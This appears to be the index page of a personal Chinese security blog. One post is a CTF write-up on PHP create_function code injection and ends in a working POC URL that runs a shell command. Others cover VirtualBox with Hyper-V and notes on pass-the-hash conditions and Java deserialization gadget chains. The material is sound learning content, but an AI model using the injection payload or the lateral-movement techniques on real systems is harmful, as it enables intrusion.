<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="s0nnse">
<meta property="og:url" content="https://github.com/s0nnse/index.html">
<meta property="og:site_name" content="s0nnse">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="s0nnse">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/s0nnse/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>s0nnse</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">s0nnse</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/PHP%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B9%8Bcreate-function/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/10/PHP%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E4%B9%8Bcreate-function/" class="post-title-link" itemprop="url">PHP代码中的危险函数之create_function</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-07-10 22:36:56 / Modified: 22:44:20" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:56+08:00">2020-07-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><h4 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h4><p>create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用，类似于Java、Python中的Lambda表达式。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure>

<p>string $args 变量部分<br>string $code 方法代码部分</p>
<h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">'$a,$b'</span>,<span class="string">'return 123'</span>)</span><br></pre></td></tr></table></figure>

<p>等价于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h4><p>利用create_function可以进行代码注入</p>
<p>看一道<a href="https://code-breaking.com/" target="_blank" rel="noopener">code-breaking</a>的一道PHP题</p>
<p>先贴一下代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要先绕过正则匹配，需要绕过正则的话需要在create_function函数的首或者尾增加一个不在匹配范围内的字符，而且不能影响函数的正常调用。</p>
<p>这里引入PHP命名空间(namespace)</p>
<p>PHP 命名空间(namespace)是在PHP 5.3中加入的，如果你学过C#和Java，那命名空间就不算什么新事物。 不过在PHP当中还是有着相当重要的意义。</p>
<p>PHP 命名空间可以解决以下两类问题：</p>
<ol>
<li><p>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</p>
</li>
<li><p>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MyProject</span>\<span class="title">Sub</span>\<span class="title">Level</span>;  <span class="comment">//声明分层次的单个命名空间</span></span><br></pre></td></tr></table></figure>



<p><strong>默认情况下，所有常量、类和函数名都放在全局空间下，就和PHP支持命名空间之前一样。</strong></p>
<p>所以create_function可以用\create_function进行代替</p>
<p>先测试一下<code>\</code>的效果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"123"</span>);</span><br><span class="line">\printf(<span class="string">"456"</span>);</span><br></pre></td></tr></table></figure>

<p>通过输出可以看到<code>printf</code>和<code>\printf</code>执行结果是一样的，那么这里使用<code>\create_function</code>来绕过正则匹配。</p>
<p>这里如果我们想要执行任意代码，就首先需要跳出这个函数定义。即在<code>return 123;</code>后添加<code>}</code>让函数定义结束，在插入我们想要执行的代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\create_function(<span class="string">''</span>, <span class="string">'return 123;&#125; printf(`dir`);//'</span>);</span><br></pre></td></tr></table></figure>

<p>这里补充一点：</p>
<p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“`”的效果与函数 <a href="https://www.php.net/manual/zh/function.shell-exec.php" target="_blank" rel="noopener">shell_exec()</a> 相同。</p>
<p>最后的POC应该是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action&#x3D;\create_function&amp;arg&#x3D;return%202333;&#125;%20printf(&#96;dir&#96;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/virtualbox6%E5%92%8Chypre-v%E5%85%B1%E5%AD%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/10/virtualbox6%E5%92%8Chypre-v%E5%85%B1%E5%AD%98%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" class="post-title-link" itemprop="url">virtualbox6和hypre-v共存解决办法</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-07-10 22:36:45 / Modified: 22:43:45" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:45+08:00">2020-07-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近尝试使用了微软的WSL2，体验非常好，但同时还要使用VrtualBox会和wsl2使用的Hyper-v冲突，造成VrtualBox不能正常使用。原因是Hyper-v的虚拟方式不一样，开启Hyper-v后会将用户的桌面系统给虚拟化，用户的桌面系统就会成为Hyper-v的虚拟系统，而Hyper-v的虚拟系统是不允许再开虚拟机的，因此开启Hyper-v后VM和Vbox就不能运行。</p>
<img src="/images/virtualbox6和hypre-v共存解决办法/虚拟区别对比.jpg" alt="虚拟区别对比" style="zoom: 80%;" />


<p>而Vbox在第六个版本（Vbox6.0）中新增了利用Hyper-v的api进行虚拟化系统</p>
<p>这个功能还是实验性的功能，可能会出现意想不到的问题，出现问题请向官方反馈以助于完善。</p>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>前提要求：</p>
<ol>
<li>Windows 版本: 2004+</li>
<li>VirtualBox 版本: 6.0+</li>
<li>CPU启用虚拟化</li>
</ol>
<p>由于这个功能还是实验性的功能，所以没有现成的GUI按钮或界面开启这个功能，需要使用命令行开启。<br>找到vbox的安装目录，确定目录下有<code>VBoxManage.exe</code><br>在该目录打开命令行工具（目录空白位置按住shift 鼠标点击右键，选择<code>在此处打开命令窗口</code>或<code>在此处打开PwerShell窗口</code>）<br>命令窗口(cmd)输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">指定vbox下的虚拟系统开启这个功能</span></span><br><span class="line">VBoxManage setextradata "&lt;虚拟机名字&gt;" "VBoxInternal/NEM/UseRing0Runloop" 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">或指定vbox所有虚拟系统开启</span></span><br><span class="line">VBoxManage setextradata global "VBoxInternal/NEM/UseRing0Runloop" 0</span><br></pre></td></tr></table></figure>

<p>PowerShell需要加<code>./</code>和<code>.exe</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定vbox下的虚拟系统开启这个功能</span></span><br><span class="line">./VBoxManage.exe setextradata <span class="string">"&lt;虚拟机名字&gt;"</span> <span class="string">"VBoxInternal/NEM/UseRing0Runloop"</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#或指定vbox所有虚拟系统开启</span></span><br><span class="line">./VBoxManage.exe setextradata global <span class="string">"VBoxInternal/NEM/UseRing0Runloop"</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>开启后，就可以同时使用Hyper-v和Vbox。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/10/%E6%9D%82%E9%A1%B9%E5%A4%87%E5%BF%98%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/10/%E6%9D%82%E9%A1%B9%E5%A4%87%E5%BF%98%E5%BD%95/" class="post-title-link" itemprop="url">杂项备忘录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-07-10 22:36:38 / Modified: 22:40:26" itemprop="dateCreated datePublished" datetime="2020-07-10T22:36:38+08:00">2020-07-10</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>所有内容是开发、渗透、漏洞研究过程中的片段笔记，无上下文，非完整内容。</p>
<h5 id="1、使用olivere-elastic连接远程elasticsearch失败"><a href="#1、使用olivere-elastic连接远程elasticsearch失败" class="headerlink" title="1、使用olivere/elastic连接远程elasticsearch失败"></a>1、使用<a href="https://github.com/olivere/elastic">olivere/<em>elastic</em></a>连接远程elasticsearch失败</h5><p>使用<a href="https://github.com/olivere/elastic">olivere/<em>elastic</em></a>连接elasticsearch时，发现连接地址明明输入的时候是公网地址，但是连接时会自动转换成内网地址或者docker中的ip地址，导致服务连接不上。</p>
<p>解决办法：</p>
<figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">client, _ := elastic.NewClient(</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 将sniff设置为false后，便不会自动转换地址</span></span><br><span class="line">   elastic.SetSniff(<span class="literal">false</span>),</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h5 id="2、使用gopacket编写代码后进行交叉编译失败。"><a href="#2、使用gopacket编写代码后进行交叉编译失败。" class="headerlink" title="2、使用gopacket编写代码后进行交叉编译失败。"></a>2、使用gopacket编写代码后进行交叉编译失败。</h5><p>原因：因为gopacket在windows下需要使用winpack，而linux下需要使用libpacp依赖，进行交叉编译的时候会因为依赖问题无法进行交叉编译。</p>
<p>解决办法：分别在windows、linux环境下各自编译。</p>
<h5 id="3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。"><a href="#3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。" class="headerlink" title="3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。"></a>3、elasticsearch在多线程，多进程同时写入大量数据的时候会丢失部分数据。</h5><p>原因：当某个线程池active==threads时，表示所有线程都在忙，那么后续新的请求就会进入queue中，即queue&gt;0，一旦queue大小超出限制，如bulk的queue默认50，那么elasticsearch进程将拒绝请求（返回HTTP状态码429），相应的拒绝次数就会累加到rejected中。</p>
<p>Elasticsearch核心线程池有index、search、get、bulk等，具体作用如下。</p>
<ul>
<li>index：此线程池用于索引和删除操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为300。</li>
<li>search：此线程池用于搜索和计数请求。它的类型默认为fixed，size默认为可用处理器的数量乘以3，队列的size默认为1000。</li>
<li>suggest：此线程池用于建议器请求。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
<li>get：此线程池用于实时的GET请求。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
<li>bulk：此线程池用于批量操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为50。</li>
<li>percolate：此线程池用于预匹配器操作。它的类型默认为fixed，size默认为可用处理器的数量，队列的size默认为1000。</li>
</ul>
<p>其中的线程池类型cache和fixed含义如下。</p>
<ul>
<li>cache<br>无限制的线程池，为每个请求创建一个线程。</li>
<li>fixed<br>有着固定大小的线程池，大小由size属性指定，允许你指定一个队列（使用queue_size属性指定）用来保存请求，直到有一个空闲的线程来执行请求。如果Elasticsearch无法把请求放到队列中（队列满了），该请求将被拒绝。</li>
</ul>
<p>解决方法：尽量不改动线程池大小，对于线程池的调整原理，可参考数据库连接池大小的调整原理，其基本结论就是，池的大小跟CPU核心数息息相关，通常不要高于<code>2*CPU核心数</code>，过高就会产生反作用。这里可以设置queue的大小。</p>
<p>修改elasticsearch.yml，增大写入时的队列大小</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">thread_pool.write.queue_size:</span> <span class="number">50000</span></span><br></pre></td></tr></table></figure>

<p>当还是存在问题的时候使用filebeat完成日志的远程写入，Filebeat是本地文件的日志数据采集器，可监控日志目录或特定日志文件（tail file），并将它们转发给Elasticsearch或Logstatsh进行索引、kafka等。带有内部模块（auditd，Apache，Nginx，System和MySQL），可通过一个指定命令来简化通用日志格式的收集，解析和可视化。</p>
<h5 id="4、docker常用命令"><a href="#4、docker常用命令" class="headerlink" title="4、docker常用命令"></a>4、docker常用命令</h5><p>搜索镜像：docker search [组件/应用/系统]</p>
<p>拉取镜像：docker pull [镜像名:版本]</p>
<p>创建容器：docker run –name [容器名] -p [主机端口:容器端口] -v [主机目录:容器目录] -e [配置] -d [镜像名:版本]</p>
<p>进入容器：docker exec -it [容器id/容器名] /bin/bash</p>
<p>启动容器：docker start [容器id/容器名]</p>
<p>停止容器：docker stop [容器id/容器名]</p>
<p>重启容器：docker restart [容器id/容器名]</p>
<h5 id="5、哈希传递攻击适用情况："><a href="#5、哈希传递攻击适用情况：" class="headerlink" title="5、哈希传递攻击适用情况："></a>5、哈希传递攻击适用情况：</h5><p>在工作组环境中：</p>
<ul>
<li><p>Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。</p>
</li>
<li><p>Windows Vista 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</p>
</li>
</ul>
<p>在域环境中：</p>
<ul>
<li>只能是域管理员组内用户(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。</li>
</ul>
<p>造成的差异由KB2871997补丁产生</p>
<p>微软在2014年5月发布了 KB2871997 和 KB2928120 两个补丁。KB2871997针对PTH攻击，而 KB2928120 针对GPP(Group Policy Preference)。KB2871997 补丁将使本地帐号不再可以用于远程接入系统，不管是 Network logon 还是 Interactive login。其后果就是：无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等。</p>
<p>在实际测试中，更新KB2871997之后，发现无法使用常规的哈希传递方法进行横向移动，但 administrator(SID=500) 账号例外，使用该账号的散列值依然可以进行哈希传递攻击。这里需要强调的是 SID=500 的账号。即使将administrator账号改名，也不会影响SID的值。所以，如果攻击者使用SID为500的账号进行哈希传递攻击，就不会受到KB2871997的影响。</p>
<h5 id="5、各版本JDK"><a href="#5、各版本JDK" class="headerlink" title="5、各版本JDK"></a>5、各版本JDK</h5><ul>
<li>java SE 1.6各个版本 jdk </li>
</ul>
<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html</a></p>
<ul>
<li>java SE 1.7各个版本 jdk </li>
</ul>
<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html</a></p>
<ul>
<li>java SE 1.8各个版本 jdk </li>
</ul>
<p><a href="http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</a></p>
<h5 id="6、java反序列化"><a href="#6、java反序列化" class="headerlink" title="6、java反序列化"></a>6、java反序列化</h5><ul>
<li>危险的基础库：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload <span class="number">1.3</span><span class="number">.1</span></span><br><span class="line">commons-io <span class="number">2.4</span></span><br><span class="line">commons-collections <span class="number">3.1</span></span><br><span class="line">commons-logging <span class="number">1.2</span></span><br><span class="line">commons-beanutils <span class="number">1.9</span><span class="number">.2</span></span><br><span class="line">org.slf4j:slf4j-api <span class="number">1.7</span><span class="number">.21</span></span><br><span class="line">com.mchange:mchange-commons-java <span class="number">0.2</span><span class="number">.11</span></span><br><span class="line">org.apache.commons:commons-collections <span class="number">4.0</span></span><br><span class="line">com.mchange:c3p0 <span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span></span><br><span class="line">org.beanshell:bsh <span class="number">2.0</span>b5</span><br><span class="line">org.codehaus.groovy:groovy <span class="number">2.3</span><span class="number">.9</span></span><br><span class="line">org.springframework:spring-aop <span class="number">4.1</span><span class="number">.4</span>.RELEASE</span><br></pre></td></tr></table></figure>

<ul>
<li>输入点的常用函数：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="comment">// 流转化为Object</span></span><br><span class="line">ObjectInputStream.readUnshared <span class="comment">// 流转化为Object</span></span><br><span class="line">XMLDecoder.readObject <span class="comment">// 读取xml转化为Object</span></span><br><span class="line">Yaml.load<span class="comment">// yaml字符串转Object</span></span><br><span class="line">XStream.fromXML<span class="comment">// XStream用于Java Object与xml相互转化</span></span><br><span class="line">ObjectMapper.readValue<span class="comment">// jackson中的api</span></span><br><span class="line">JSON.parseObject<span class="comment">// fastjson中的api</span></span><br></pre></td></tr></table></figure>

<p>序列化数据通常以<code>AC ED</code>开始，之后的两个字节是版本号，版本号一般是<code>00 05</code>但在某些情况下可能是更高的数字。</p>
<p>Commons-Collections各个版本下载地址：<a href="http://archive.apache.org/dist/commons/collections/source/" target="_blank" rel="noopener">http://archive.apache.org/dist/commons/collections/source/</a></p>
<ul>
<li>触发反序列化漏洞条件：<br>（1）使用了InvokeTransformer的对象，并在transform方法里执行代码；<br>（2）使用TransformedMap通过执行setValue方法来触发transform方法。<br><strong>我们要触发TransformedMap的putAll/put/checkSetValue方法(其中任意一种)</strong><br>Apache Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来<strong>调用任意函数</strong>，叫做InvokerTransformer。<br>InvokeTransformer方法提供了将一个对象转换到另一个对象，或者在转换的时候调整对象的属性等方法。执行代码的时候会经过两次反射，一次是InvokerTransformer的反射，在一次是插入的恶意代码的反射。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">            object = iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>前一个object会做为下一个的参数传入，所有可以进行类-&gt;方法-&gt;执行的调用。</p>
<p>POC执行流程为 TransformedMap-&gt;AnnotationInvocationHandler.readObject()-&gt;setValue()- 漏洞成功触发，<strong><em>jdk&lt;=7</em></strong><br>(1)java方法重写：如果一个类的方法被重写，那么调用该方法时优先调用该方法<br>(2)JAVA反射机制：在运行状态中<br>　　　　　　　　　　　　　对于任意一个类，都能够判断一个对象所属的类；<br>　　　　　　　　　　　　　对于任意一个类，都能够知道这个类的所有属性和方法；<br>　　　　　　　　　  　 　      对于任意一个对象，都能够调用它的任意一个方法和属性；<br>(3)认识关键类与函数<br>    TransformedMap ：      利用其value修改时触发transform()的特性<br>    ChainedTransformer： 会挨个执行我们定义的Transformer<br>    Transformer:                 存放我们要执行的命令<br>    AnnotationInvocationHandler：对memberValues的每一项调用了setValue()函数</p>
<p> 要通过外部触发这条攻击链，需要实现的目标有三个<br> 1)触发put/putAll/checkSetValue(这个只能传入参数至valueTransformer)任意方法其一<br> 2)找到某个可序列化的类，重写了readObject方法<br> 3)readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的</p>
<h5 id="7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包"><a href="#7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包" class="headerlink" title="7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包"></a>7、linux下使用Tshark抓docker部署的应用的流量会抓到多个重复的包</h5><p>原因：Tshark设置any网卡进行抓包时，因为docker会自动在虚拟出虚拟网卡，会造成抓到多个重复包。</p>
<p>解决方法：设置物理网卡或者需要抓取流量的docker容器对应的虚拟网卡。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/07/08/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="s0nnse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="s0nnse">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/08/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">逆向学习笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

